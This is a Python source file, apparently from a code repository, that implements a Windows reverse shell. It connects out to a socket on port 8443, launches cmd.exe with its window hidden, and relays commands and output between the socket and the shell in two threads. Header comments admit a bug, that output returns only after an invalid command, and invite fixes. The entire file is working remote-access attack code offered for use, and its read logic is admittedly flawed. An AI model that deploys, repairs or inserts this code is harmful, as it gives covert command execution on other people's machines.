# only sends back output once an invalid command is sent
# struggling to figure out why, if you solve it, send a PR

import socket
import subprocess
import threading
import sys

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
try:
    s.connect(("127.0.0.1", 8443))
except socket.error as e:
    print(f"Connection failed: {e}")
    sys.exit(1)

# Start cmd.exe with the appropriate flags and pipe configuration
proc = subprocess.Popen(
    ["cmd.exe"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    shell=True,
    bufsize=1024,
    creationflags=subprocess.CREATE_NO_WINDOW
)

# Function to handle incoming data from socket and send to process's stdin
def socket_to_proc():
    try:
        while True:
            data = s.recv(1024)
            if not data:
                break
            proc.stdin.write(data)
            proc.stdin.flush()
    except Exception:
        cleanup()

# Function to handle process's stdout/stderr and send to socket
def proc_to_socket():
    try:
        while True:
            # Read from both stdout and stderr
            output = proc.stdout.read1(1024)  # Using read1 for better buffering
            err_output = proc.stderr.read1(1024)  # Using read1 for better buffering
            
            # Send both outputs
            s.send(output + err_output)  # Combine and send both outputs together
            
            # Check if process has ended
            if proc.poll() is not None:
                break
    except Exception:
        cleanup()

def cleanup():
    proc.terminate()
    s.close()
    sys.exit(1)

# Start threads for bi-directional communication
t1 = threading.Thread(target=socket_to_proc, daemon=True)
t2 = threading.Thread(target=proc_to_socket, daemon=True)
t1.start()
t2.start()

# Wait for threads to complete
try:
    t1.join()
    t2.join()
except KeyboardInterrupt:
    cleanup()